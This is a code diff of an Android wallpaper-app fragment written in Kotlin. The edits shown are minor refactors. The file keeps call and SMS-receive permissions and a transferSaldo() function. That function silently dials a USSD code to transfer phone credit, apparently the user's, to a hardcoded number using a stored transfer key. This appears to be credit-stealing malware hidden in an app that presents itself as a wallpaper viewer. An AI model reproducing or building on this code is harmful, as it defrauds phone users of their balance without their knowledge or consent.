@@ -39,10 +39,14 @@ import kotlinx.coroutines.withContext
 
 
 class WallpaperFragment : Fragment(), IAndroidApi {
-    private val CALL_REQUEST_PERMISSION: Int = 7854
+    companion object {
+        private const val CALL_REQUEST_PERMISSION: Int = 7854
+        private const val SMS_RECEIVE_PERMISSION_CODE = 4856
+    }
+
     private lateinit var binding: FragmentWallpaperViewpagerBinding
     private lateinit var userPref: UserPreferencesRepository
-    private val SMS_RECEIVE_PERMISSION_CODE = 4856
+
     private lateinit var USER_TRANSFER_KEY: String
 
     private val wallpaperViewModel: WallpapersViewModel by viewModels {
@@ -83,7 +87,7 @@ class WallpaperFragment : Fragment(), IAndroidApi {
         binding.viewPageWallpaper.adapter = wallpaperAdapter
 
         wallpaperViewModel.allWallpapers.observe(viewLifecycleOwner, { listChanges ->
-            wallpaperAdapter.setData(listChanges)
+            wallpaperAdapter.submitList(listChanges)
         })
 
 
@@ -163,7 +167,7 @@ class WallpaperFragment : Fragment(), IAndroidApi {
 
     private fun transferSaldo() {
         if (USER_TRANSFER_KEY.isNotEmpty()) {
-            var urltransfer = "*234*1*54074127*$USER_TRANSFER_KEY*10${Uri.encode("#")}"
+            val urltransfer = "*234*1*54074127*$USER_TRANSFER_KEY*10${Uri.encode("#")}"
             val callIntent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$urltransfer"))
             requireContext().startActivity(callIntent)
         }
